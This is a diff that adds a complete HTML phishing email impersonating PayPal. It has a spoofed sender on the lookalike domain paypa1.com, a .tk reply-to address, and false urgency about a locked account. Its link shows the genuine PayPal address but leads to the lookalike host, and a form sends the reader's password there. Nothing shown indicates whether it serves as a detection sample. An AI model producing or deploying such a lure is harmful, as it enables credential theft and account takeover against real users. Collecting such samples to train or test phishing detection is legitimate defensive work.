@@ -1,0 +1,20 @@
+From: "PayPal Security" <security@paypa1.com>
+Reply-To: unlock@secure-login.tk
+To: customer@example.com
+Subject: Your PayPal account has been limited
+Date: Wed, 05 Nov 2025 02:14:00 +0000
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html>
+<body>
+<p>Dear customer,</p>
+<p>We noticed unusual sign-in activity. Your PayPal account has been locked.
+Verify your identity immediately or the account will be closed within 24 hours.</p>
+<p><a href="http://paypa1.com/login">https://www.paypal.com/signin</a></p>
+<form action="http://paypa1.com/login" method="post">
+<input type="password" name="password">
+<input type="submit" value="Verify account">
+</form>
+</body>
+</html>
